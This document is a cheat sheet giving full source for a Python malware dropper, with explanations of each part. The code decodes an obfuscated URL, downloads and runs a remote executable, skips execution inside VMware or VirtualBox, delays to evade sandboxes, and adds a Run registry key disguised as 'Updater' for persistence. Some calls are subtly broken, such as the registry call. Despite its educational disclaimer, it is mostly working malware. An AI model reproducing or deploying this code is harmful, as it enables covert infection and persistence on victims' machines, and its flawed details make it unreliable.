# Advanced Dropper Malware Cheat Sheet (For Educational Purposes)

This cheat sheet covers an advanced **Python dropper** that stealthily downloads, executes a secondary payload, and automatically installs necessary Python modules. This enhanced version also includes features for persistence, anti-analysis checks, and stealthy execution. **For lab and research environments only; unauthorized use is illegal.**

---

## Dropper Overview

A **dropper** is a type of malware that “drops” or downloads additional malicious components onto a target system. The example here:
- **Downloads**: A secondary malicious payload from a remote server.
- **Checks for Dependencies**: Ensures that required modules are installed and installs them if missing.
- **Stealth Features**: Uses anti-sandboxing, obfuscation, and persistence techniques.

---

## Advanced Python Dropper Code

This dropper code uses Python, with automatic handling of dependencies to ensure it runs on the target machine even if modules are missing. It also has features to evade detection, maintain persistence, and execute the payload silently.

### Full Dropper Code

```python
import os
import sys
import subprocess
import tempfile
import base64
import time
import ctypes

# Function to check and install dependencies
def install_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        print(f"[*] Installing {module_name} module...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])

# Automatically ensure required modules are installed
install_module("requests")
import requests

# Base64 encoded URL of the payload for obfuscation
PAYLOAD_URL = base64.b64decode("aHR0cDovL2V4YW1wbGUuY29tL21hbGljaW91c19wYXlsb2FkLmV4ZQ==").decode('utf-8')

# Function to check if running in a virtual environment
def is_virtual_environment():
    vmware_check = "VMware" in subprocess.getoutput("systeminfo")
    virtualbox_check = "VirtualBox" in subprocess.getoutput("systeminfo")
    return vmware_check or virtualbox_check

# Anti-sandboxing delay
time.sleep(10)

# Define the main dropper function
def dropper():
    if is_virtual_environment():
        print("[!] Virtual environment detected. Exiting.")
        sys.exit(1)
    
    try:
        # Step 1: Create a temporary directory
        temp_dir = tempfile.gettempdir()
        payload_path = os.path.join(temp_dir, "malicious_payload.exe")
        
        # Step 2: Download the payload
        print("[*] Downloading payload...")
        response = requests.get(PAYLOAD_URL, stream=True)
        
        # Write payload to disk
        if response.status_code == 200:
            with open(payload_path, "wb") as payload_file:
                for chunk in response.iter_content(1024):
                    payload_file.write(chunk)
            print(f"[*] Payload downloaded to {payload_path}")
        else:
            print("[!] Failed to download payload")
            return
        
        # Step 3: Persistence - Add to startup registry
        try:
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            value_name = "Updater"
            ctypes.windll.advapi32.RegSetValueExW(ctypes.windll.advapi32.HKEY_CURRENT_USER, key, 0, 1, value_name, payload_path)
            print("[*] Persistence achieved via registry key.")
        except Exception as e:
            print(f"[!] Failed to add persistence: {e}")
        
        # Step 4: Execute the payload in a hidden window
        print("[*] Executing payload...")
        subprocess.Popen(payload_path, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[*] Payload executed.")
        
    except Exception as e:
        print(f"[!] Error occurred: {e}")

# Run the dropper function
if __name__ == "__main__":
    dropper()
```

---

## Explanation of Key Components

### 1. **Module Installation Function**

The `install_module()` function ensures that the required Python modules are installed on the target machine. If a module is missing, it automatically installs it using `pip`.

```python
def install_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        print(f"[*] Installing {module_name} module...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
```

### 2. **Obfuscated Payload URL**

The payload URL is Base64 encoded to evade static analysis tools. The script decodes it at runtime:

```python
PAYLOAD_URL = base64.b64decode("aHR0cDovL2V4YW1wbGUuY29tL21hbGljaW91c19wYXlsb2FkLmV4ZQ==").decode('utf-8')
```

### 3. **Virtual Environment Detection**

The `is_virtual_environment()` function checks for VMware or VirtualBox indicators in `systeminfo`, helping to avoid detection in sandboxed environments.

```python
def is_virtual_environment():
    vmware_check = "VMware" in subprocess.getoutput("systeminfo")
    virtualbox_check = "VirtualBox" in subprocess.getoutput("systeminfo")
    return vmware_check or virtualbox_check
```

### 4. **Anti-Sandboxing Delay**

The dropper pauses for 10 seconds using `time.sleep(10)` to evade sandbox detection.

```python
time.sleep(10)
```

### 5. **Payload Download**

The `requests` library downloads the payload in binary chunks, reducing memory usage.

```python
response = requests.get(PAYLOAD_URL, stream=True)
with open(payload_path, "wb") as payload_file:
    for chunk in response.iter_content(1024):
        payload_file.write(chunk)
```

### 6. **Persistence Mechanism**

The dropper adds a registry entry to the **Run** key so the payload executes every time the user logs in:

```python
key = r"Software\Microsoft\Windows\CurrentVersion\Run"
value_name = "Updater"
ctypes.windll.advapi32.RegSetValueExW(ctypes.windll.advapi32.HKEY_CURRENT_USER, key, 0, 1, value_name, payload_path)
```

### 7. **Silent Payload Execution**

Using `subprocess.Popen()` with `shell=True` ensures the payload is executed in a hidden process:

```python
subprocess.Popen(payload_path, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
```

---

## Security and Legal Disclaimer

This dropper script is for educational purposes only and must only be used in a controlled lab environment. Unauthorized use, distribution, or execution of malware is illegal and unethical.

--- 

**End of Cheat Sheet**
```
